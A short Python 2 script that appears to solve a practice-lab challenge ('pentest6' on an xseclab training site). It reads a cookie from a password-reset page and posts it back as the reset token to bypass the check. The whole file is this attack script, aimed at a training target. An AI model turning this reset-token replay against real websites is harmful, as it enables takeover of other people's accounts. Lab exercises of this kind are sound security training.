import cookielib
from urllib2 import Request, build_opener, HTTPCookieProcessor, HTTPHandler
import time ,urllib,requests

cj =  cookielib.CookieJar()
opener = build_opener(HTTPCookieProcessor(cj),HTTPHandler)
f = opener.open("http://lab1.xseclab.com/pentest6_210deacdf09c9fe184d16c8f7288164f/resetpwd.php")
token = [c.value for c in cj][0]

session = requests.Session()
url = 'http://lab1.xseclab.com/pentest6_210deacdf09c9fe184d16c8f7288164f/resetpwd.php'
data = {'token':token}
reqpost = session.post(url, data=data)
print reqpost.content

'''
print "The cookies are:"
for cookie in cj:
	print cookie
	for i in range(10):
		f = opener.open("http://lab1.xseclab.com/pentest6_210deacdf09c9fe184d16c8f7288164f/resetpwd.php")
		html = f.read()

		print "The cookies are:"
		for cookie in cj:
			print cookie
'''

